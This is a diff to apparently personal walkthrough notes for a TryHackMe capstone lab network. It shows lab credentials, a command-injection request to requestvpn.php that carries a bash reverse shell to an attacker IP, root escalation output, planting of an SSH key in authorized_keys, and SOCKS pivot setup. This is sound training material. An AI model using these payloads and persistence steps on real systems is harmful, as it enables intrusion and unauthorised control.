@@ -50,19 +50,20 @@ sudo openvpn corpUsername.ovpn
 
 
 # Generate new ovpn
-Login with the creds first:
+Login with the creds first through web portal:
 ```txt
 laura.wood@corp.thereserve.loc Password1@
 mohammad.ahmed@corp.thereserve.loc Password1!
 ```
 
 It prevents you from kicking out by having your own ovpn file.
+
 # Hack the VPN server instead of using ovpn
 Login with the creds first. This way is more stable to get DC. Chisel from WRK1 to DC also doable, but not as stable as ssh tunneling since that's under rdp.
 
 ### Command Injection
 ```bash burp
-GET /requestvpn.php?filename=qwer%40corp.thereserve.loc+%26%26+bash+-i+>%26+/dev/tcp/10.50.110.158/80+0>%261 HTTP/1.1
+GET /requestvpn.php?filename=qwer%40corp.thereserve.loc+%26%26+bash+-i+>%26+/dev/tcp/10.50.115.198/80+0>%261 HTTP/1.1
 ```
 
 ### Privilege Escalation via cp
@@ -97,13 +98,15 @@ root@ip-10-200-113-12:/tmp# whoami
 whoami
 root
 ```
+
 ### SSH as root
 ```bash
 # grab the pub
 ssh-keygen -t rsa -b 4096 -C "baturu@thm.com"
 
-echo "ssh-rsa public id_rsa_pub baturu@thm.com" >> authorized_keys
+echo "ssh-rsa SNIP== xxx@thm.com" >> authorized_keys
 ```
+
 ### Setup SSH Pivoting
 ```bash
 ssh -D 1085 root@$IP -i id_rsa
@@ -111,6 +114,7 @@ ssh -D 1085 root@$IP -i id_rsa
 
 ```conf
 # Change to 1085 for THM Capstone
+# Others might choose 1080 or 9050 since the popularity
 # socks4 	127.0.0.1 1085
 socks5 	127.0.0.1 1085
 ```
